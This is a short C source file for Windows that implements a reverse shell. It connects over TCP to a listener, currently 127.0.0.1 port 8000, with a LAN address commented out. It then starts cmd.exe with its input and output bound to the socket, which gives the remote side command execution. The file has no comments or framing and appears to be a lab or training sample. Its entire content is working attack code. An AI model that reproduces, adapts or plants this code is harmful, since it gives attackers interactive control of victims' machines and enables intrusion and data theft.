# include <stdio.h>

# include <windows.h>


void
main(void)
{
  WSADATA wsa = { 0 };
  int error = 0;
  SOCKET client;
  SOCKADDR_IN addr;
  char buf[1024];
  STARTUPINFO si = { 0 };
  PROCESS_INFORMATION pi = { 0 };

  error = WSAStartup(MAKEWORD(2, 2), &wsa);
  if (error) {
    return;
  }

  client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (client == INVALID_SOCKET) {
    return;
  }

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("127.0.0.1"); /* inet_addr("192.168.56.1"); */
  addr.sin_port = htons(8000);
  error = connect(client, (SOCKADDR *)&addr, sizeof addr);
  if (error) {
    return;
  }

  si.cb = sizeof si;
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = (HANDLE)client;
  si.hStdOutput = (HANDLE)client;
  si.hStdError = (HANDLE)client;
  if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe",
                      NULL, NULL, NULL, TRUE, 0, NULL, NULL,
                      &si, &pi)) {
    return;
  }

  return;
}
